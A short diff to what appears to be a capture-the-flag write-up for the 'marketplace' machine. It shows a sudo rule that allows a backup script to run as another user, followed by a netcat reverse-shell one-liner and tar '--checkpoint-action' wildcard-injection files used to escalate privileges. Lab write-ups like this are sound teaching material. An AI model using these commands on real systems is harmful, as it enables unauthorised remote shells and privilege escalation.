@@ -55,10 +55,10 @@ sudo -l
 
 User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
+```
+we can exploit tar to gain access on the machine
 
-we can abuse tar to gain access on the machine
-
-``` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.10.4 9001 >/tmp/f" > shell.sh
+ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.10.4 9001 >/tmp/f" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1 ```
 
